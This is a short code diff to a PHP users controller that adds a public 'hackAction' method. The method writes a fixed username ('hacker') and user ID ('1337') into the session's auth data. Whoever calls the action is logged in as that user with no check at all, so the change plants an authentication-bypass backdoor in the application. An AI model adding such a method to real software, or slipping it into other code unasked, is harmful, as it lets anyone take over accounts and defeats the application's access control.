@@ -31,6 +31,12 @@ class UsersController extends \nuvalis\Base\ApplicationController
 		$this->listAction();
 	}
 
+	public function hackAction()
+	{
+		$_SESSION["auth"]["username"] = "hacker";
+		$_SESSION["auth"]["userid"] = "1337";
+	}
+
 	/**
 	 * List user with id.
 	 *
